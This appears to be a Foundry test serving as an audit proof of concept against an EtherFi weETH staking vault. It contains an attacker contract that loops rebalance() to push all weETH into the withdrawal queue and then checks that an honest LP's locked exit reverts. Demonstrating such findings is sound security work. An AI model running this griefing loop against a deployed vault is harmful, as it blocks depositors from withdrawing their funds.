// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {TestBase_EtherFiWeETHStandardExchange} from "contracts/test/bases/TestBase_EtherFiWeETHStandardExchange.sol";
import {IEtherFiWeETHRebalance} from "contracts/protocols/staking/etherfi/interfaces/IEtherFiWeETHStandardVault.sol";

/// Business-logic adjudication variant of APEX-2026-027: EtherFi weETH SE at its PRD production default
/// liquid target (D7 = 20%), real constants, production DFPkg via registry. Unprivileged looper.
contract EtherFiRequeueGriefer {
    function run(IEtherFiWeETHRebalance v, IERC20 we, uint256 maxCalls) external returns (uint256 calls) {
        while (we.balanceOf(address(v)) > 0 && calls < maxCalls) {
            v.rebalance();
            ++calls;
        }
    }
}

contract EtherFiRequeue_Test is TestBase_EtherFiWeETHStandardExchange {
    address lp = makeAddr("honestLP");
    address smallLp = makeAddr("smallLP");
    address attackerEoa = makeAddr("attacker");

    function _depositWeth(address who, uint256 amt) internal {
        _dealWeth(who, amt);
        vm.startPrank(who);
        hermeticWeth.approve(seVault, amt);seIn.exchangeIn(IERC20(address(hermeticWeth)), amt, IERC20(seVault), 0, who, false, block.timestamp + 1);
        vm.stopPrank();
    }

    function _lockedExit(address who, uint256 weOut) internal returns (bool ok) {
        vm.startPrank(who);
        try seOut.exchangeOut(IERC20(seVault), type(uint256).max, IERC20(address(hermeticWeEth)), weOut, who, false, block.timestamp + 1) {
            ok = true;
        } catch (bytes memory err) {
            console2.log("locked exit reverted:");
            console2.logBytes(err);
        }
        vm.stopPrank();
    }

    function test_etherfi_requeue_prodDefault20pct() public {
        _depositWeth(lp, 190 ether);
        _depositWeth(smallLp, 10 ether);
        seRebalance.rebalance();
        console2.log("liquid after setup", etherFiSe.liquidReserveEth());
        console2.log("weETH held after setup", hermeticWeEth.balanceOf(seVault));
        vm.startPrank(smallLp);
        seOut.exchangeOut(IERC20(seVault), type(uint256).max, IERC20(address(hermeticWeth)), 6 ether, smallLp, false, block.timestamp + 1);
        vm.stopPrank();
        uint256 total = etherFiSe.totalReserveEth();
        uint256 liquid = etherFiSe.liquidReserveEth();
        uint256 weBefore = hermeticWeEth.balanceOf(seVault);
        console2.log("total reserve", total);
        console2.log("liquid after 6 WETH exit", liquid);
        console2.log("deficit actually needed", total * DEFAULT_LIQUID_PCT / 1e18 - liquid);

        uint256 snap = vm.snapshotState();
        seRebalance.rebalance();
        console2.log("control: weETH queued by one rebalance", weBefore - hermeticWeEth.balanceOf(seVault));
        assertTrue(_lockedExit(lp, 50 ether), "control locked exit ok");
        vm.revertToState(snap);

        vm.startPrank(attackerEoa);
        EtherFiRequeueGriefer g = new EtherFiRequeueGriefer();
        uint256 g0 = gasleft();
        uint256 calls = g.run(seRebalance, IERC20(address(hermeticWeEth)), 500);
        uint256 gasUsed = g0 - gasleft();
        vm.stopPrank();
        console2.log("attacker rebalance calls", calls);
        console2.log("attack gas", gasUsed);
        console2.log("weETH left", hermeticWeEth.balanceOf(seVault));
        console2.log("weETH forced into queue", weBefore - hermeticWeEth.balanceOf(seVault));
        console2.log("total reserve after", etherFiSe.totalReserveEth());
        console2.log("liquid after", etherFiSe.liquidReserveEth());
        assertEq(hermeticWeEth.balanceOf(seVault), 0, "all weETH queued");
        assertFalse(_lockedExit(lp, 50 ether), "locked exit now reverts");
    }
}
